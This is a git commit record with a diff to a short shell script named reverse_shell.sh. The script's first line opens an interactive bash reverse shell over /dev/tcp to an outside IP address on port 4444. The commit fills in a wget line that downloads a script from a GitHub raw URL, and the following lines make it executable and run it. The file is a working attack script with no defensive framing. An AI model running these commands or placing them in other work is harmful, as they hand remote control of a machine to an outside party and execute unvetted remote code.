9c1044fdfba3003d5bfa96c33c63b54ac9d55aa3
NarbehJackson <81082128+NarbehJackson@users.noreply.github.com>
2024-10-06 14:11:47 +0330

    Update reverse_shell.sh

--- reverse_shell.sh
+++ reverse_shell.sh
@@ -1,4 +1,4 @@
 bash -i >& /dev/tcp/23.27.169.114/4444 0>&1
-wget 
+wget https://raw.githubusercontent.com/NarbehJackson/test/refs/heads/main/reverse_shell.sh
 chmod +x reverse_shell.sh
 ./reverse_shell.sh
